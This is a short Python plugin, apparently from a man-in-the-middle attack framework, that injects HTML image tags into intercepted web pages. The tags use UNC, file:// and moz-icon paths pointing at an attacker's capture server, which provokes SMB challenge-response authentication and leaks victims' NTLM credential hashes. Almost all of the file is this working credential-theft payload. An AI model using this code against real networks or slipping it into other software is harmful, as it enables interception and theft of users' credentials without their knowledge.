from plugins.plugin import Plugin
from plugins.Inject import Inject
import sys
import logging

class SMBAuth(Inject, Plugin):
    name     = "SMBAuth"
    optname  = "smbauth"
    desc     = "Evoke SMB challenge-response auth attempts"
    depends  = ["Inject"]
    version  = "0.1"
    has_opts = True
    req_root = False

    def initialize(self, options):
        Inject.initialize(self, options)
        self.target_ip = options.host
        self.html_payload = self._get_data()

        if not self.target_ip:
            self.target_ip = options.ip_address

    def add_options(self, options):
        options.add_argument("--host", type=str, default=None, help="The ip address of your capture server [default: interface IP]")

    def _get_data(self):
        return '<img src=\"\\\\%s\\image.jpg\">'\
                '<img src=\"file://///%s\\image.jpg\">'\
                '<img src=\"moz-icon:file:///%%5c/%s\\image.jpg\">' % tuple([self.target_ip]*3)
